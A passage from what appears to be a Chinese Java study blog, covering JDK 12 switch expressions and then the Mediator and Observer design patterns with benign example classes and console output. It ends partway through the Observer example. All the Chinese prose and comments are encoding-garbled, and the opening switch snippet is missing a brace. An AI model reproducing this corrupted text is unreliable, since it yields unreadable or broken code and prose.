IllegalStateException("score:" + score);}/*JDK12æ–°ç‰¹æ€§å†™æ³•:å°†æ­¤è¡¨è¾¾ä¸ºä¸€ç§é™ˆè¿°æ˜¯è¿‚å›çš„,é‡å¤çš„,å¹¶ä¸”å®¹æ˜“å‡ºé”™. æ„å‘³ç€æˆ‘ä»¬åº”è¯¥è®¡ç®—numLettersæ¯ä¸€å¤©çš„ä»·å€¼,åº”è¯¥å¯ä»¥ç›´æ¥è¯´,ä½¿ç”¨æ›´æ¸…æ™°,æ›´å®‰å…¨Switchè¡¨è¾¾å¼:*/int numLetters2 = switch (score) {    case 60, 70 -> 6;    case 80, 90 -> 7;    case 95, 100 -> 8;    default -> throw new IllegalStateException("count:" + score);};/*å¦‚æœå°†å®ƒç”¨åœ¨æ–¹æ³•ä¸Š,åˆ™å¯ä»¥ä¸ºå†™æˆ:*/static void howMany(int k) {    switch (k) {        case 1 -> System.out.println("one");        case 2 -> System.out.println("two");        case 3 -> System.out.println("many");}/*æˆ–è€…ç±»ä¸Š,ä¾‹å¦‚å°†è¿™ä¸ªæ–°ç‰¹æ€§ç”¨åœ¨æŠ½è±¡å·¥å‚ç±»:*/ T result = switch (arg) {    case L1 -> e1;    case L2 -> e2;    default -> e3;};

ğŸ‘For more information, please refer to http://openjdk.java.net/projects/jdk/12/ and the document : https://docs.oracle.com/en/java/javase/12/

entry.title: Javaè®¾è®¡æ¨¡å¼ä¹‹Mediator Pattern
entry.content:
å­¦ä¹ ç¬”è®° : Javaè®¾è®¡æ¨¡å¼ä¹‹Mediator Pattern

å®šä¹‰

ä¸­ä»‹è€…è®¾è®¡æ¨¡å¼ : å®šä¹‰ä¸€ä¸ªå¯¹è±¡æ¥å°è£…ä¸€ç³»åˆ—å¯¹è±¡çš„äº¤äº’. ä¸­ä»‹è€…æ¨¡å¼ä½¿å„ä¸ªç”¨æˆ·å¯¹è±¡ä¹‹é—´ä¸éœ€è¦æ˜¾ç¤ºåœ°ç›¸äº’å¼•ç”¨,ä»è€Œä½¿å…¶è€¦åˆæ¾æ•£,è€Œä¸”ç”¨æˆ·å¯ä»¥ç‹¬ç«‹åœ°æ”¹å˜å®ƒä»¬ä¹‹é—´çš„äº¤äº’. ( Mediator Pattern : Define an object that encapsulates how a set of objects interact. Mediator promotes loose coupling by keeping objects from referring to each other explicitly,and it lets you vary their interaction independently. )

ä¸­ä»‹è€…æ¨¡å¼åˆç§°ä¸ºè°ƒåœè€…æ¨¡å¼,å®ƒæ˜¯ä¸€ç§å¯¹è±¡è¡Œä¸ºæ¨¡å¼. åœ¨ä¸­ä»‹è€…è®¾è®¡æ¨¡å¼ä¸­,é€šè¿‡å¼•å…¥ä¸­ä»‹è€…æ¥ç®€åŒ–å¯¹è±¡ä¹‹é—´çš„å¤æ‚äº¤äº’,ä¸­ä»‹è€…æ¨¡å¼æ˜¯è¿ªç±³ç‰¹æ³•åˆ™çš„ä¸€ä¸ªå…¸å‹åº”ç”¨

è§’è‰²åˆ†æ

  1. Mediator( æŠ½è±¡ä¸­ä»‹è€… ) : å®ƒå®šä¹‰ä¸€ä¸ªæ¥å£,è¯¥æ¥å£ç”¨äºä¸å„åŒäº‹å¯¹è±¡ä¹‹é—´è¿›è¡Œé€šä¿¡.
  2. ConcreteMediator( å…·ä½“ä¸­ä»‹è€… ) : å®ƒæ˜¯æŠ½è±¡ä¸­ä»‹è€…çš„å­ç±»,é€šè¿‡åè°ƒå„ä¸ªåŒäº‹å¯¹è±¡æ¥å®ç°åä½œè¡Œä¸º,å®ƒç»´æŒäº†å¯¹å„ä¸ªåŒäº‹å¯¹è±¡çš„å¼•ç”¨.
  3. Colleague( æŠ½è±¡åŒäº‹ç±» ) : å®ƒå®šä¹‰å„ä¸ªåŒäº‹ç±»å…¬æœ‰çš„æ–¹æ³•,å¹¶å£°æ˜äº†ä¸€äº›æŠ½è±¡æ–¹æ³•ä¾›å­ç±»å®ç°,åŒæ—¶å®ƒç»´æŒäº†ä¸€ä¸ªå¯¹æŠ½è±¡ä¸­ä»‹è€…ç±»çš„å¼•ç”¨,å…¶å­ç±»å¯ä»¥é€šè¿‡è¯¥å¼•ç”¨ä¸ä¸­ä»‹è€…é€šä¿¡.
  4. ConcreteColleague( å…·ä½“åŒæ—¶ç±» ) : å®ƒæ˜¯æŠ½è±¡åŒäº‹ç±»çš„å­ç±»,æ¯ä¸€ä¸ªåŒäº‹å¯¹è±¡åœ¨éœ€è¦å’Œå…¶ä»–åŒäº‹å¯¹è±¡é€šä¿¡æ—¶å…ˆä¸ä¸­ä»‹è€…é€šä¿¡,é€šè¿‡ä¸­ä»‹è€…é—´æ¥å®Œæˆä¸å…¶ä»–åŒäº‹ç±»çš„é€šä¿¡; åœ¨å…·ä½“åŒäº‹ç±»ä¸­å®ç°äº†åœ¨æŠ½è±¡åŒäº‹ç±»ä¸­å£°æ˜çš„æŠ½è±¡æ–¹æ³•.

ç¨‹åºç¤ºä¾‹

ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ä¸­ä»‹è€…æ¨¡å¼çš„ç®€å•ç¤ºä¾‹ç¨‹åº : è®¾è®¡ä¸€ä¸ª CRM æ¡Œé¢ç³»ç»Ÿ,å…¶ä¸­åŒ…å«ä¸€ä¸ªå®¢æˆ·ä¿¡æ¯ç®¡ç†æ¨¡å—,å…¶ç•Œé¢ç»„ä»¶ä¹‹é—´å­˜åœ¨å¤æ‚çš„äº¤äº’å…³ç³»,å¦‚æœåˆ é™¤ä¸€ä¸ªå®¢æˆ·,åˆ™ä»å®¢æˆ·åˆ—è¡¨ä¸­( List )ä¸­åˆ æ‰å¯¹åº”çš„é¡¹,å®¢æˆ·é€‰æ‹©ç»„åˆæ¡†( ComboBox )ä¸­çš„å®¢æˆ·åç§°ä¹Ÿå°†å‡å°‘ä¸€ä¸ª; å¦‚æœå¢åŠ ä¸€ä¸ªå®¢æˆ·ä¿¡æ¯,åˆ™å®¢æˆ·åˆ—è¡¨ä¸­å°†å¢åŠ ä¸€ä¸ªå®¢æˆ·,å¹¶ä¸”ç»„åˆæ¡†ä¸­ä¹Ÿå°†å¢åŠ ä¸€é¡¹. ä¸ºäº†æ›´å¥½åœ°å¤„ç†ç•Œé¢ç»„ä»¶ä¹‹é—´çš„äº¤äº’,ç°ä½¿ç”¨ä¸­ä»‹è€…æ¨¡å¼è®¾è®¡è¯¥ç³»ç³»ç»Ÿ~

  1. Mediator.java : æŠ½è±¡ä¸­ä»‹è€…ç±»

    package pers.huangyuhui.mediator_pattern.mediator_pattern_1;/** * @project: design-patterns * @description: æŠ½è±¡ä¸­ä»‹è€…ç±» * @author: é»„å®‡è¾‰ * @date: 10/10/2019-12:49 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public abstract class Mediator {    public abstract void componentChanged(Component component);}

  2. ConcreteMediator.java : å…·ä½“ä¸­ä»‹è€…ç±»

    package pers.huangyuhui.mediator_pattern.mediator_pattern_1;/** * @project: design-patterns * @description: å…·ä½“ä¸­ä»‹è€…ç±» * @author: é»„å®‡è¾‰ * @date: 10/10/2019-12:50 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class ConcreteMediator extends Mediator {    //ç»´æŒå¯¹å„ä¸ªåŒäº‹å¯¹è±¡çš„å¼•ç”¨    public List list;    public Button addButton;    public TextBox userNameTextBox;    public ComboBox comboBox;    //å°è£…åŒäº‹å¯¹è±¡ä¹‹é—´çš„äº¤äº’    @Override    public void componentChanged(Component component) {        //å•å‡»æŒ‰é’®        if (component == addButton) {            System.out.println("--- ç‚¹å‡»å¢åŠ ä¿¡æ¯æŒ‰é’® ---");            list.update();            comboBox.update();            userNameTextBox.update();        }        //ä»åˆ—è¡¨æ¡†é€‰æ‹©å®¢æˆ·        else if (component == list) {            System.out.println("\n--- ä»åˆ—è¡¨æ¡†é€‰æ‹©å®¢æˆ· ---");            list.select();            userNameTextBox.setText();        }        //ä»ç»„åˆæ¡†é€‰æ‹©å®¢æˆ·        else if (component == comboBox) {            System.out.println("\n--- ä»ç»„åˆæ¡†é€‰æ‹©å®¢æˆ· ---");            comboBox.select();            userNameTextBox.setText();        }    }}

  3. Component.java : æŠ½è±¡ç»„ä»¶ç±», å……å½“æŠ½è±¡åŒäº‹ç±»

    package pers.huangyuhui.mediator_pattern.mediator_pattern_1;/** * @project: design-patterns * @description: æŠ½è±¡ç»„ä»¶ç±», å……å½“æŠ½è±¡åŒäº‹ç±» * @author: é»„å®‡è¾‰ * @date: 10/10/2019-12:51 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public abstract class Component {    protected Mediator mediator;    public void setMediator(Mediator mediator) {        this.mediator = mediator;    }    //è½¬å‘è°ƒç”¨    public void changed() {        mediator.componentChanged(this);    }    public abstract void update();}

  4. Button.java : æŒ‰é’®ç±», å……å½“å…·ä½“åŒäº‹ç±»

    package pers.huangyuhui.mediator_pattern.mediator_pattern_1;/** * @project: design-patterns * @description: æŒ‰é’®ç±», å……å½“å…·ä½“åŒäº‹ç±» * @author: é»„å®‡è¾‰ * @date: 10/10/2019-12:51 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class Button extends Component {    public void update() {        //System.out.println("ç‚¹å‡»æ·»åŠ ä¿¡æ¯æŒ‰é’®");    }}

  5. List.java : åˆ—è¡¨æ¡†ç±», å……å½“å…·ä½“åŒäº‹ç±»

    package pers.huangyuhui.mediator_pattern.mediator_pattern_1;/** * @project: design-patterns * @description: åˆ—è¡¨æ¡†ç±», å……å½“å…·ä½“åŒäº‹ç±» * @author: é»„å®‡è¾‰ * @date: 10/10/2019-12:52 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class List extends Component {    public void update() {        System.out.println("åˆ—è¡¨æ¡†å¢åŠ ä¸€é¡¹: é»„å®‡è¾‰");    }    public void select() {        System.out.println("åˆ—è¡¨æ¡†é€‰ä¸­é¡¹: é»„æµ©ç„¶");    }}

  6. ComboBox.java : ç»„åˆæ¡†ç±», å……å½“å…·ä½“åŒäº‹ç±»

    package pers.huangyuhui.mediator_pattern.mediator_pattern_1;/** * @project: design-patterns * @description: ç»„åˆæ¡†ç±», å……å½“å…·ä½“åŒäº‹ç±» * @author: é»„å®‡è¾‰ * @date: 10/10/2019-12:55 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class ComboBox extends Component {    public void update() {        System.out.println("ç»„åˆæ¡†å¢åŠ ä¸€é¡¹: é»„å®‡è¾‰");    }    public void select() {        System.out.println("ç»„åˆæ¡†é€‰ä¸­é¡¹: é»„æµ©ç„¶");    }}

  7. TextBox.java : æ–‡æœ¬æ¡†, å……å½“å…·ä½“åŒäº‹ç±»

    package pers.huangyuhui.mediator_pattern.mediator_pattern_1;/** * @project: design-patterns * @description: æ–‡æœ¬æ¡†, å……å½“å…·ä½“åŒäº‹ç±» * @author: é»„å®‡è¾‰ * @date: 10/10/2019-12:56 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class TextBox extends Component {    public void update() {        System.out.println("å®¢æˆ·ä¿¡æ¯å¢åŠ æˆåŠŸåæ–‡æœ¬æ¡†è¢«æ¸…ç©º");    }    public void setText() {        System.out.println("æ–‡æœ¬æ¡†æ˜¾ç¤º: é»„æµ©ç„¶");    }}

  8. Client.java : å®¢æˆ·ç«¯æµ‹è¯•ç±»

    package pers.huangyuhui.mediator_pattern.mediator_pattern_1;/** * @project: design-patterns * @description: å®¢æˆ·ç«¯æµ‹è¯•ç±» * @author: é»„å®‡è¾‰ * @date: 10/10/2019-12:58 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class Client {    public static void main(String[] args) {        //å®šä¹‰ä¸­ä»‹è€…å¯¹è±¡        ConcreteMediator mediator = new ConcreteMediator();        //å®šä¹‰åŒäº‹å¯¹è±¡        List list = new List();        Button addButton = new Button();        ComboBox comboBox = new ComboBox();        TextBox userNameTextBox = new TextBox();        //å…³è”ä¸­ä»‹è€…        list.setMediator(mediator);        comboBox.setMediator(mediator);        addButton.setMediator(mediator);        userNameTextBox.setMediator(mediator);        //åˆå§‹åŒ–å…·ä½“åŒäº‹ç±»        mediator.list = list;        mediator.comboBox = comboBox;        mediator.addButton = addButton;        mediator.userNameTextBox = userNameTextBox;        //é€šè¿‡ä¸­ä»‹è€…è¿›è¡Œé€šä¿¡        addButton.changed(); //ç‚¹å‡»æ·»åŠ å®¢æˆ·ä¿¡æ¯æŒ‰é’®        list.changed(); //ä»åˆ—è¡¨æ¡†ä¸­é€‰æ‹©å®¢æˆ·        comboBox.changed(); //ä»ç»„åˆæ¡†ä¸­é€‰æ‹©å®¢æˆ·    }}

  9. ç¨‹åºè¿è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤º :

    --- ç‚¹å‡»å¢åŠ ä¿¡æ¯æŒ‰é’® ---åˆ—è¡¨æ¡†å¢åŠ ä¸€é¡¹: é»„å®‡è¾‰ç»„åˆæ¡†å¢åŠ ä¸€é¡¹: é»„å®‡è¾‰å®¢æˆ·ä¿¡æ¯å¢åŠ æˆåŠŸåæ–‡æœ¬æ¡†è¢«æ¸…ç©º--- ä»åˆ—è¡¨æ¡†é€‰æ‹©å®¢æˆ· ---åˆ—è¡¨æ¡†é€‰ä¸­é¡¹: é»„æµ©ç„¶æ–‡æœ¬æ¡†æ˜¾ç¤º: é»„æµ©ç„¶--- ä»ç»„åˆæ¡†é€‰æ‹©å®¢æˆ· ---ç»„åˆæ¡†é€‰ä¸­é¡¹: é»„æµ©ç„¶æ–‡æœ¬æ¡†æ˜¾ç¤º: é»„æµ©ç„¶

ç±»å›¾

ç¨‹åºç¤ºä¾‹-æ‰©å±•

å¯¹ä¸Šè¿°ç¤ºä¾‹ç¨‹åºè¿›è¡Œæ”¹è¿›,ä½¿å®¢æˆ·ä¿¡æ¯ç®¡ç†çª—å£ä¸‹ç«¯èƒ½å¤ŸåŠæ—¶æ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸­å®¢æˆ·ä¿¡æ¯çš„æ€»æ•°. ç”±äºä¸Šè¿°æ¡ˆä¾‹ä½¿ç”¨äº†ä¸­ä»‹è€…è®¾è®¡æ¨¡å¼,æ‰€ä»¥åœ¨åŸæœ‰ç³»ç»Ÿä¸­å¢åŠ æ–°çš„ç»„ä»¶( æ—¢æ–°çš„åŒäº‹ç±» )å°†å˜å¾—å¾ˆå®¹æ˜“,è§£å†³æ–¹æ¡ˆ : é¦–å…ˆå¢åŠ ä¸€ä¸ª Label ç±»,å…¶æ¬¡å¢åŠ ä¸€ä¸ª ConcreteMediator çš„å­ç±» SubConcreteMediator æ¥å®ç°å¯¹ Label å¯¹è±¡çš„å¼•ç”¨,ç„¶ååœ¨æ–°å¢çš„ä¸­ä»‹è€…ç±» SubConcreteMediator ä¸­é€šè¿‡è¦†ç›– componentChanged() æ–¹æ³•å®ç°æ‰€æœ‰ç»„ä»¶( åŒ…æ‹¬æ–°å¢Lableç»„ä»¶ )ä¹‹é—´çš„äº¤äº’. æ—¢åŸæœ‰ç»„ä»¶ç±»æ— éœ€åšä»»ä½•ä¿®æ”¹,å®¢æˆ·ç«¯ä»£ç ä»…éœ€åšå°‘é‡ä¿®æ”¹,å…¶æ›´åŠ ç¬¦åˆå¼€é—­åŸåˆ™~

  1. Label.java : æ–‡æœ¬æ ‡ç­¾ç±», å…·ä½“åŒäº‹ç±»

    package pers.huangyuhui.mediator_pattern.mediator_pattern_2;/** * @project: design-patterns * @description: æ–‡æœ¬æ ‡ç­¾ç±», å…·ä½“åŒäº‹ç±» * @author: é»„å®‡è¾‰ * @date: 10/10/2019-1:30 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class Label extends Component {        public void update() {        System.out.println("[ æ–‡æœ¬æ ‡ç­¾å†…å®¹æ”¹å˜,å®¢æˆ·ä¿¡æ¯æ€»æ•°: +1 ]");    }}

  2. SubConcreteMediator.java : åœ¨æ–°å¢çš„è¯¥ä¸­ä»‹è€…ç±», é€šè¿‡è¦†å†™componentChanged()æ–¹æ³•æ¥å®ç°æ‰€æœ‰ç»„ä»¶(åŒ…æ‹¬æ–°å¢Labelç»„ä»¶)ä¹‹é—´çš„äº¤äº’

    package pers.huangyuhui.mediator_pattern.mediator_pattern_2;/** * @project: design-patterns * @description: åœ¨æ–°å¢çš„è¯¥ä¸­ä»‹è€…ç±», é€šè¿‡è¦†å†™componentChanged()æ–¹æ³•æ¥å®ç°æ‰€æœ‰ç»„ä»¶(åŒ…æ‹¬æ–°å¢Labelç»„ä»¶)ä¹‹é—´çš„äº¤äº’ * @author: é»„å®‡è¾‰ * @date: 10/10/2019-1:30 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class SubConcreteMediator extends ConcreteMediator {    //å¢åŠ å¯¹Labelå¯¹è±¡çš„å¼•ç”¨    public Label label;    @Override    public void componentChanged(Component component) {        //super.componentChanged(component);        //å•å‡»æŒ‰é’®        if (component == addButton) {            System.out.println("--- ç‚¹å‡»å¢åŠ ä¿¡æ¯æŒ‰é’® ---");            list.update();            comboBox.update();            userNameTextBox.update();            label.update(); //æ›´æ–°æ–‡æœ¬æ ‡ç­¾        }        //ä»åˆ—è¡¨æ¡†é€‰æ‹©å®¢æˆ·        else if (component == list) {            System.out.println("\n--- ä»åˆ—è¡¨æ¡†é€‰æ‹©å®¢æˆ· ---");            list.select();            userNameTextBox.setText();        }        //ä»ç»„åˆæ¡†é€‰æ‹©å®¢æˆ·        else if (component == comboBox) {            System.out.println("\n--- ä»ç»„åˆæ¡†é€‰æ‹©å®¢æˆ· ---");            comboBox.select();            userNameTextBox.setText();        }    }}

  3. Client.java : å®¢æˆ·ç«¯æµ‹è¯•ç±»

    package pers.huangyuhui.mediator_pattern.mediator_pattern_2;/** * @project: design-patterns * @description: å®¢æˆ·ç«¯æµ‹è¯•ç±» * @author: é»„å®‡è¾‰ * @date: 10/10/2019-12:58 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class Client {    public static void main(String[] args) {        //å®šä¹‰ä¸­ä»‹è€…å¯¹è±¡        SubConcreteMediator mediator = new SubConcreteMediator();        //å®šä¹‰åŒäº‹å¯¹è±¡        List list = new List();        Label label = new Label();        Button addButton = new Button();        ComboBox comboBox = new ComboBox();        TextBox userNameTextBox = new TextBox();        //å…³è”ä¸­ä»‹è€…        list.setMediator(mediator);        label.setMediator(mediator);        comboBox.setMediator(mediator);        addButton.setMediator(mediator);        userNameTextBox.setMediator(mediator);        //åˆå§‹åŒ–å…·ä½“åŒäº‹ç±»        mediator.list = list;        mediator.label = label;        mediator.comboBox = comboBox;        mediator.addButton = addButton;        mediator.userNameTextBox = userNameTextBox;        //é€šè¿‡ä¸­ä»‹è€…è¿›è¡Œé€šä¿¡        addButton.changed(); //ç‚¹å‡»æ·»åŠ å®¢æˆ·æŒ‰é’®        list.changed(); //ä»åˆ—è¡¨æ¡†ä¸­é€‰æ‹©å®¢æˆ·        comboBox.changed(); //ä»ç»„åˆæ¡†ä¸­é€‰æ‹©å®¢æˆ·    }}

  4. ç¨‹åºè¿è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤º :

    --- ç‚¹å‡»å¢åŠ ä¿¡æ¯æŒ‰é’® ---åˆ—è¡¨æ¡†å¢åŠ ä¸€é¡¹: é»„å®‡è¾‰ç»„åˆæ¡†å¢åŠ ä¸€é¡¹: é»„å®‡è¾‰å®¢æˆ·ä¿¡æ¯å¢åŠ æˆåŠŸåæ–‡æœ¬è¢«æ¸…ç©º[ æ–‡æœ¬æ ‡ç­¾å†…å®¹æ”¹å˜,å®¢æˆ·ä¿¡æ¯æ€»æ•°: +1 ]--- ä»åˆ—è¡¨æ¡†é€‰æ‹©å®¢æˆ· ---åˆ—è¡¨æ¡†é€‰ä¸­é¡¹: èµµè‰³æ˜¥æ–‡æœ¬æ¡†æ˜¾ç¤º: èµµè‰³æ˜¥--- ä»ç»„åˆæ¡†é€‰æ‹©å®¢æˆ· ---ç»„åˆæ¡†é€‰ä¸­é¡¹: èµµè‰³æ˜¥æ–‡æœ¬æ¡†æ˜¾ç¤º: èµµè‰³æ˜¥

entry.title: Javaè®¾è®¡æ¨¡å¼ä¹‹Observer Pattern
entry.content:
å­¦ä¹ ç¬”è®° : Javaè®¾è®¡æ¨¡å¼ä¹‹Observer Pattern

å®šä¹‰

è§‚å¯Ÿè€…è®¾è®¡æ¨¡å¼ : å®šä¹‰å¯¹è±¡ä¹‹é—´çš„ä¸€ç§ä¸€å¯¹å¤šçš„ä¾èµ–å…³ç³»,ä½¿å¾—æ¯å½“ä¸€ä¸ªå¯¹è±¡çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶å…¶ç›¸å…³ä¾èµ–å¯¹è±¡çš†å¾—åˆ°é€šçŸ¥å¹¶è¢«è‡ªåŠ¨æ›´æ–°. ( Observer Pattern : Define a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically )

æ¦‚è¿°

è§‚å¯Ÿè€…æ¨¡å¼çš„åˆ«åæœ‰å‘å¸ƒ-è®¢é˜…( Publish-Subscribe )æ¨¡å¼,æ¨¡å‹-è§†å›¾( Model-View )æ¨¡å¼,æº-ç›‘å¬å™¨( Source-Listener )æ¨¡å¼,ä»å±è€…( Dependents )æ¨¡å¼. è§‚å¯Ÿè€…æ¨¡å¼æ˜¯ä¸€ç§å¯¹è±¡è¡Œä¸ºæ¨¡å¼. å…¶ç”¨äºæè¿°å¯¹è±¡ä¹‹é—´çš„ä¾èµ–å…³ç³»,ä¸ºå®ç°å¤šä¸ªå¯¹è±¡ä¹‹é—´çš„è”åŠ¨æä¾›äº†ä¸€ç§è§£å†³æ–¹æ¡ˆ,æ˜¯ä¸€ç§å¯¹è±¡è¡Œä¸ºå‹æ¨¡å¼.

è§’è‰²åˆ†æ

  1. Subject( ç›®æ ‡ ) : ç›®æ ‡åˆç§°ä¸ºä¸»é¢˜,å®ƒæ˜¯æŒ‡è¢«è§‚å¯Ÿçš„å¯¹è±¡. åœ¨ç›®æ ‡ä¸­å®šä¹‰äº†ä¸€ä¸ªè§‚å¯Ÿè€…é›†åˆ,ä¸€ä¸ªè§‚å¯Ÿè€…ç›®æ ‡å¯ä»¥æ¥æ”¶ä»»æ„æ•°é‡çš„è§‚å¯Ÿè€…æ¥è§‚å¯Ÿ,å®ƒæä¾›äº†ä¸€ç³»åˆ—æ–¹æ³•æ¥å¢åŠ å’Œåˆ é™¤è§‚å¯Ÿè€…å¯¹è±¡,åŒæ—¶å®ƒå®šä¹‰äº†é€šçŸ¥æ–¹æ³• notify(). ç›®æ ‡ç±»å¯ä»¥æ˜¯æ¥å£,ä¹Ÿå¯ä»¥æ˜¯æŠ½è±¡ç±»æˆ–å…·ä½“ç±».
  2. ConcreteSubject( å…·ä½“ç›®æ ‡ ) : å…·ä½“ç›®æ ‡æ˜¯ç›®æ ‡ç±»çš„å­ç±»,å®ƒé€šå¸¸åŒ…å«æœ‰ç»å¸¸æ–¹æ³•æ”¹å˜çš„æ•°æ®,å½“å®ƒçš„çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶å°†å‘å®ƒçš„å„ä¸ªè§‚å¯Ÿè€…å‘å‡ºé€šçŸ¥,åŒæ—¶è¿˜å¯ä»¥å®ç°äº†åœ¨ç›®æ ‡ç±»ä¸­å®šä¹‰çš„æŠ½è±¡ä¸šåŠ¡é€»è¾‘æ–¹æ³•. å¦‚æœæ— éœ€æ‰©å±•ç›®æ ‡ç±»,åˆ™å…·ä½“ç›®æ ‡ç±»å¯ä»¥çœç•¥.
  3. Observer( è§‚å¯Ÿè€… ) : è§‚å¯Ÿè€…å°†å¯¹è§‚å¯Ÿç›®æ ‡çš„æ”¹å˜åšå‡ºååº”,è§‚å¯Ÿè€…ä¸€èˆ¬å®šä¹‰ä¸ºæ¥å£,è¯¥æ¥å£å£°æ˜äº†æ›´æ–°æ•°æ®çš„ update() æ–¹æ³•,å› æ­¤åˆç§°ä¸ºæŠ½è±¡è§‚å¯Ÿè€….
  4. ConcreteObserver( å…·ä½“è§‚å¯Ÿè€… ) : åœ¨å…·ä½“è§‚å¯Ÿè€…ä¸­ç»´æŠ¤äº†ä¸€ä¸ªæŒ‡å‘å…·ä½“ç›®æ ‡å¯¹è±¡çš„å¼•ç”¨,å®ƒå­˜å‚¨å…·ä½“è§‚å¯Ÿè€…çš„æœ‰å…³çŠ¶æ€,è¿™äº›çŠ¶æ€éœ€è¦å’Œç›®æ ‡çš„çŠ¶æ€ä¿æŒä¸€è‡´. å®ƒå®ç°äº†åœ¨æŠ½è±¡è§‚å¯Ÿè€… Observer ä¸­å®šä¹‰çš„ update() æ–¹æ³•. é€šå¸¸åœ¨å®ç°æ—¶å¯ä»¥è°ƒç”¨å…·ä½“ç›®æ ‡ç±»çš„ attach() æ–¹æ³•å°†è‡ªå·±æ·»åŠ åˆ°ç›®æ ‡ç±»çš„é›†åˆä¸­æˆ–é€šè¿‡ detach() æ–¹æ³•å°†è‡ªå·±ä»ç›®æ ‡ç±»çš„é›†åˆä¸­åˆ é™¤.

ç¤ºä¾‹ç¨‹åº

ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨è§‚å¯Ÿè€…è®¾è®¡æ¨¡å¼çš„ç®€å•ç¤ºä¾‹ç¨‹åº,æ¨¡æ‹ŸåŠŸèƒ½ : åœ¨æŸå¤šäººè”æœºå¯¹æˆ˜æ¸¸æˆä¸­,å¤šä¸ªç©å®¶å¯ä»¥åŠ å…¥åŒä¸€æˆ˜é˜Ÿç»„æˆè”ç›Ÿ,å½“æˆ˜é˜Ÿä¸­çš„æŸä¸€æˆå‘˜è¢«æ•Œäººæ”»å‡»æ—¶,å…¶å¯ä»¥å‘å…¶å®ƒé˜Ÿå‹å‘é€æ±‚æ•‘é€šçŸ¥,é˜Ÿå‹æ¥æ”¶é€šçŸ¥åä½œå‡ºç›¸åº”çš„ååº”,æ—¢è€Œæ¥å®ç°æˆ˜é˜Ÿæˆå‘˜ä¹‹é—´çš„è”åŠ¨~

  1. AllyControllerCenteræŠ½è±¡ç±» : æŒ‡æŒ¥éƒ¨(æˆ˜é˜Ÿæ§åˆ¶ä¸­å¿ƒ)ç±», å……å½“æŠ½è±¡ç›®æ ‡ç±»

    package pers.huangyuhui.observer_pattern.observer_pattern_1;import java.util.ArrayList;/** * @project: design-patterns * @description: æŒ‡æŒ¥éƒ¨(æˆ˜é˜Ÿæ§åˆ¶ä¸­å¿ƒ)ç±», å……å½“æŠ½è±¡ç›®æ ‡ç±» * @author: é»„å®‡è¾‰ * @date: 9/29/2019-12:02 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public abstract class AllyControllerCenter {    protected String allyName;    //å®šä¹‰ä¸€ä¸ªé›†åˆç”¨äºå­˜å‚¨æˆ˜é˜Ÿæˆå‘˜    protected ArrayList<Observer> players = new ArrayList<>();    public void setAllyName(String allyName) {        this.allyName = allyName;    }    public String getAllyName(String allyName) {        return allyName;    }    //æ³¨å†Œæ–¹æ³•    public void join(Observer observer) {        System.out.println("ç©å®¶: [ " + observer.getName() + " ]åŠ å…¥æˆ˜é˜Ÿ");        players.add(observer);    }    //æ³¨é”€æ–¹æ³•    public void quit(Observer observer) {        System.out.println("ç©å®¶: [ " + observer.getName() + " ]é€€å‡ºæˆ˜é˜Ÿ");        players.remove(observer);    }    //å£°æ˜æŠ½è±¡é€šçŸ¥æ–¹æ³•    public abstract void noifyObserver(String name);}

  2. ConcreteAllyControlCenterç±» : å…·ä½“æŒ‡æŒ¥éƒ¨ç±», å……å½“å…·ä½“ç›®æ ‡ç±»

    package pers.huangyuhui.observer_pattern.observer_pattern_1;/** * @project: design-patterns * @description: å…·ä½“æŒ‡æŒ¥éƒ¨ç±», å……å½“å…·ä½“ç›®æ ‡ç±» * @author: é»„å®‡è¾‰ * @date: 9/29/2019-12:16 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class ConcreteAllyControlCenter extends AllyControllerCenter {    public ConcreteAllyControlCenter(String allyName) {        this.allyName = allyName;        System.out.println("------ æˆ˜é˜Ÿ: [ " + allyName + " ]ç»„å»ºæˆåŠŸ ------");    }    //å®ç°é€šçŸ¥æ–¹æ³•    @Override    public void noifyObserver(String name) {        System.out.println("æˆ˜é˜Ÿ: [ " + this.allyName + " ]æŒ‡æŒ¥éƒ¨å‘é€çš„ç´§æ€¥é€šçŸ¥ : é˜Ÿå‹[ " + name + " ]æ­£åœ¨é­å—æ•Œäººæ”»å‡»");        //éå†è§‚å¯Ÿè€…é›†åˆ,è°ƒç”¨æ¯ä¸€ä¸ªé˜Ÿå‹(é™¤è‡ªå·±)çš„æ”¯æ´æ–¹æ³•        for (Observer player : players) {            if (!(player.getName().equalsIgnoreCase(name))) {                player.help();            }        }    }}

  3. Observeræ¥å£ : æŠ½è±¡è§‚å¯Ÿè€…ç±»

    package pers.huangyuhui.observer_pattern.observer_pattern_1;/** * @project: design-patterns * @description: æŠ½è±¡è§‚å¯Ÿè€…ç±» * @author: é»„å®‡è¾‰ * @date: 9/29/2019-12:05 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public interface Observer {    String getName();    void setName(String name);    void help(); //å£°æ˜æ”¯æ´ç›Ÿå‹çš„æ–¹æ³•    void beAttacked(AllyControllerCenter allyControllerCenter); //å£°æ˜é­å—æ”»å‡»çš„æ–¹æ³•}

  4. Playerç±» : æˆ˜é˜Ÿæˆå‘˜ç±», å……å½“å…·ä½“è§‚å¯Ÿè€…ç±»

